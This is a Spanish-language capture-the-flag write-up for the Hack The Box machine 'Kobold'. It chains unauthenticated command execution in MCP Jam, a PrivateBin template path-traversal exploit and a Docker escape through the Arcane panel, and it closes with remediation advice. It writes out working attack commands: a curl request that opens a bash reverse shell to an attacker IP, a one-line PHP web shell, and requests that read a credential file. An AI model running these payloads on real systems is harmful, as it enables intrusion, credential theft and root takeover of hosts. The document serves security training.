---
layout: single
classes: wide
title: "Kobold - Writeup"
date: 2026-04-10
difficulty: FÃ¡cil
operating_system: Linux
service_hint: MCP Jam API + PrivateBin + Arcane
tags:
  - RCE
  - LFI
  - Path Traversal
  - Credenciales
  - Docker
  - MCP Jam
summary: "Cadena de explotaciÃ³n: RCE sin autenticaciÃ³n en MCP Jam, abuso de PrivateBin para ejecutar PHP, extracciÃ³n de credenciales redactadas y escape al host a travÃ©s de Arcane/Docker."
---

## InformaciÃ³n general

| Campo | Valor |
|-------|-------|
| Sistema operativo | Linux |
| Dificultad | FÃ¡cil |
| Tags | `RCE`, `LFI`, `Path Traversal`, `ReutilizaciÃ³n de credenciales`, `Escalada de privilegios con Docker`, `CVE-2026-23744`, `MCP Jam` |
{: .info-table}

## Reconocimiento

Como en cualquier ejercicio de pentest o HTB, el objetivo inicial no es "tirar exploits", sino construir contexto tÃ©cnico suficiente para priorizar superficies de ataque. Para eso se combinaron `nmap` y `wfuzz`.

Este primer escaneo con `nmap` sirve para detectar puertos abiertos rÃ¡pidamente y reducir la superficie a analizar.

```bash
nmap -p- --open -sS --min-rate 5000 -Pn 10.129.31.14
```

Una vez identificados los puertos expuestos, este segundo escaneo profundiza en versiones, banners, tÃ­tulos HTTP y fingerprints de servicio.

```bash
nmap -p22,80,443,3552 -sCV 10.129.31.14
```

Los indicadores mÃ¡s Ãºtiles de esta fase fueron:

- `80/tcp` y `443/tcp` redirigen a `kobold.htb`, lo que obliga a trabajar con nombre virtual y no solo con IP.
- El certificado TLS expone `kobold.htb` y `*.kobold.htb`, una pista clara de que puede haber subdominios adicionales.
- `3552/tcp` devuelve una aplicaciÃ³n HTTP basada en Go, con una respuesta tipo SPA y rutas como `/api/app-images/favicon`, lo que sugiere una consola web moderna o panel administrativo.

Con ese contexto, el siguiente paso lÃ³gico es fuzzear virtual hosts. `wfuzz` se usa aquÃ­ no como fuerza bruta ciega, sino como tÃ©cnica de expansiÃ³n de superficie aprovechando el wildcard del certificado.

```bash
wfuzz -H "Host: FUZZ.kobold.htb" --hc 404,403 --hh=154 \
  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
  https://kobold.htb
```

Subdominios relevantes:

- `mcp.kobold.htb` -> MCP Jam
- `bin.kobold.htb` -> PrivateBin

Ese resultado ya ordena la investigaciÃ³n: `bin` apunta a un producto conocido y `mcp` sugiere una aplicaciÃ³n mÃ¡s especializada, probablemente con endpoints API propios.

## EnumeraciÃ³n

Con los subdominios identificados, profundizamos en cada uno para entender su funcionalidad.

### MCP Jam (`mcp.kobold.htb`)

El servicio en `3552/tcp` con frontend SPA y rutas como `/api/app-images/favicon` sugerÃ­a una consola administrativa. Inspeccionando el trÃ¡fico desde las DevTools del navegador, identificamos endpoints API como `/api/mcp/connect` que aceptaban configuraciones JSON con parÃ¡metros `serverConfig`, `command`, `args` y `env`.

### PrivateBin (`bin.kobold.htb`)

PrivateBin es una aplicaciÃ³n conocida para compartir pastas cifradas. La instalaciÃ³n parecÃ­a estÃ¡ndar con rutas como `/js/` y `/css/`. El uso de cookies como `template` para cargar plantillas era un punto de interÃ©s evidente.

## MetodologÃ­a de anÃ¡lisis del vector inicial

El punto de entrada se priorizÃ³ en `mcp.kobold.htb` porque el nombre del subdominio y la respuesta del servicio en `3552/tcp` sugerÃ­an una aplicaciÃ³n orientada a integraciÃ³n, con backend JSON y endpoints operativos. En este tipo de superficies, cualquier acciÃ³n tipo "connect" o "run" merece atenciÃ³n temprana porque a menudo termina exponiendo ejecuciÃ³n de procesos en el host.

Las notas no conservan el discovery exacto del endpoint, asÃ­ que no afirmo si `/api/mcp/connect` se obtuvo desde DevTools, desde el JavaScript cliente o desde documentaciÃ³n expuesta. MetodolÃ³gicamente, el flujo razonable era inspeccionar trÃ¡fico en **DevTools / Network tab**, revisar rutas `/api/...` en el frontend, reproducir peticiones con `curl` y contrastar el producto en **Google**, **GitHub**, **searchsploit**, **NVD** y buscadores de **CVE**.

## InvestigaciÃ³n de vulnerabilidades y seÃ±ales de riesgo

Como referencia para quien quiera investigar mÃ¡s a fondo el vector de MCP Jam, puede revisarse `CVE-2026-23744`. En cualquier caso, la explotaciÃ³n no depende de esa referencia externa, sino de lo observado directamente en la aplicaciÃ³n.

Lo que vuelve especialmente sospechoso a `/api/mcp/connect` es que el payload acepta `serverConfig`, `command`, `args` y `env`, es decir, parÃ¡metros semÃ¡nticamente equivalentes a lanzar un proceso arbitrario desde el backend. Cuando una API permite definir binario y argumentos desde el cliente, el salto de funcionalidad insegura a RCE es mÃ­nimo y justifica validaciÃ³n inmediata.

## Acceso inicial con MCP Jam

Antes de probar una posible ejecuciÃ³n remota, se prepara un listener con `nc` para recibir una reverse shell y evitar perder tiempo una vez confirmada la explotaciÃ³n.

```bash
nc -nlvp 4444
```

Una vez identificado el endpoint sospechoso, `curl` permite reproducir la peticiÃ³n manualmente y comprobar si el servidor ejecuta el comando especificado en el JSON. Se utiliza `curl` porque elimina cualquier dependencia del cliente web y deja claro que la lÃ³gica vulnerable estÃ¡ en el backend.

```bash
curl -k https://mcp.kobold.htb/api/mcp/connect \
  -H "Content-Type: application/json" \
  -d '{
    "serverConfig": {
      "command": "bash",
      "args": ["-c", "bash -i >& /dev/tcp/10.10.14.191/4444 0>&1"],
      "env": {}
    },
    "serverId": "mytest"
  }'
```

La ejecuciÃ³n de esta peticiÃ³n devuelve una shell como `ben`, lo que valida la hipÃ³tesis de RCE sin necesidad de apoyarse en un exploit pÃºblico ni en una CVE confirmada.

Este comando contextualiza la shell obtenida y revela un dato clave para la siguiente fase: `ben` pertenece al grupo `operator`.

```bash
id
```

Salida relevante:

```text
uid=1001(ben) gid=1001(ben) groups=1001(ben),37(operator)
```

La flag de usuario existe en `/home/ben/user.txt`, pero su valor se omite deliberadamente.

## EnumeraciÃ³n local

Este comando lista usuarios interactivos y ayuda a identificar otras cuentas potencialmente reutilizadas en servicios internos.

```bash
cat /etc/passwd | grep bash
```

Este comando enumera puertos en escucha para localizar servicios internos o paneles de administraciÃ³n no evidentes desde fuera.

```bash
ss -tulnp
```

Este hallazgo muestra que el puerto `3552` sigue siendo importante y que existen servicios locales relacionados con la aplicaciÃ³n.

Este comando busca archivos y directorios accesibles por el grupo `operator`, que es justo el grupo del usuario comprometido.

```bash
find / -group operator 2>/dev/null
```

El resultado interesante es `/privatebin-data`, incluyendo el directorio `data/`, donde se pueden crear ficheros consumidos por PrivateBin.

## Abuso de PrivateBin

Este bloque crea un archivo PHP simple dentro del almacenamiento de PrivateBin para comprobar si luego puede ser interpretado desde la aplicaciÃ³n web.

```bash
cat > /privatebin-data/data/pwn.php << 'EOF'
<?php system($_GET['cmd']); ?>
EOF
```

Este `curl` abusa de la cookie `template` para forzar a PrivateBin a cargar el archivo anterior y ejecutar un comando de prueba.

```bash
curl -k https://bin.kobold.htb/ \
  -b "template=../data/pwn" \
  -G --data-urlencode "cmd=id"
```

Salida relevante:

```text
uid=65534(nobody) gid=82(www-data) groups=82(www-data)
```

Con la ejecuciÃ³n confirmada, este comando intenta leer el fichier de configuraciÃ³n para extraer secretos operativos de la aplicaciÃ³n.

```bash
curl -k https://bin.kobold.htb/ \
  -b "template=../data/pwn" \
  -G --data-urlencode "cmd=cat /srv/cfg/conf.php"
```

En la respuesta aparece configuraciÃ³n sensible. Los valores se muestran redactados:

```ini
usr = "[REDACTED]"
pwd = "[REDACTED]"
```

Lo importante no es el secreto en sÃ­, sino el impacto: la misma clave estaba reutilizada para el acceso al panel Arcane con una cuenta administrativa interna.

## Acceso a Arcane y escape al host

Las capturas del material original muestran el flujo seguido dentro de Arcane despuÃ©s de reutilizar la credencial obtenida en PrivateBin.

La primera captura corresponde al portal de login de Arcane expuesto en `http://kobold.htb:3552/login`.

![Pantalla de acceso a Arcane](/images/writeups/kobold/arcane-login.png)

Una vez autenticado, Arcane administra el socket Docker local `unix:///var/run/docker.sock`, por lo que desde su panel se pueden crear contenedores en el host.

![Panel de contenedores de Arcane](/images/writeups/kobold/arcane-containers.png)

La idea es crear un contenedor nuevo usando una imagen ya disponible, ejecutar una shell, hacerlo correr como `root` y aprovechar montajes del host.

![ConfiguraciÃ³n bÃ¡sica del contenedor](/images/writeups/kobold/container-basic-config.png)

Este paso monta la raÃ­z `/` del host dentro del contenedor en `/hostfs`, lo que abre acceso directo al filesystem real del sistema comprometido.

![Montaje del filesystem del host](/images/writeups/kobold/container-volume-mount.png)

AdemÃ¡s, se habilita `Privileged mode`, lo que elimina gran parte del aislamiento y hace trivial el acceso total al host montado.

![Modo privilegiado activado](/images/writeups/kobold/container-privileged-mode.png)

Una vez lanÃ§ado el contenedor, Arcane ofrece una shell interactiva dentro de Ã©l.

![Shell interactiva dentro del contenedor](/images/writeups/kobold/container-shell.png)

Ya dentro del contenedor, estos comandos validan que se corre como `root` y permiten leer la flag del host a travÃ©s del montaje `/hostfs`.

```bash
whoami
cat /hostfs/root/root.txt
```

El valor de la flag de `root` se omite deliberadamente.

## Cadena de explotaciÃ³n

```text
MCP Jam /api/mcp/connect sin auth
-> RCE como ben
-> pertenencia al grupo operator
-> escritura en /privatebin-data
-> template traversal / inclusiÃ³n en PrivateBin
-> lectura de configuraciÃ³n sensible
-> reutilizaciÃ³n de credenciales en Arcane
-> creaciÃ³n de contenedor privilegiado con / montado
-> acceso a /hostfs/root/root.txt
```

## Flags

| Flag | Valor |
|------|-------|
| `user.txt` | `[REDACTED]` |
| `root.txt` | `[REDACTED]` |

## Lecciones tÃ©cnicas

1. Una API que acepta comandos arbitrarios desde el cliente equivale a RCE si no existe autenticaciÃ³n fuerte y validaciÃ³n estricta.
2. Los permisos de grupo aparentemente inocentes pueden convertirse en ejecuciÃ³n de cÃ³digo al combinarse con otra aplicaciÃ³n mal diseÃ±ada.
3. PrivateBin no solo filtraba informaciÃ³n: permitÃ­a convertir escritura en disco mÃ¡s traversal de plantillas en ejecuciÃ³n de comandos.
4. Cualquier panel con acceso al socket Docker debe tratarse como acceso equivalente a `root` en el host.

## RemediaciÃ³n

1. Proteger `/api/mcp/connect` con autenticaciÃ³n y una allowlist estricta de procesos autorizados.
2. Impedir que PrivateBin cargue templates o recursos desde rutas controlables por el usuario.
3. Rotar y segregar credenciales entre servicios; una clave interna no debe reutilizarse en varios componentes.
4. Restringir el acceso a Docker y bloquear la creaciÃ³n de contenedores privilegiados con montajes del host.

## ConclusiÃ³n

HTB Kobold es una mÃ¡quina de dificultad FÃ¡cil que combina RCE sin autenticaciÃ³n en MCP Jam, abuso de PrivateBin para ejecuciÃ³n de cÃ³digo mediante path traversal en plantillas, extracciÃ³n de credenciales desde configuraciÃ³n interna, y escalada a root mediante escape de contenedor Docker a travÃ©s del panel Arcane. La lecciÃ³n principal es que los paneles de administraciÃ³n con acceso al socket Docker constituyen un riesgo de seguridad mÃ¡ximo, equivalente a entregar root en el host.
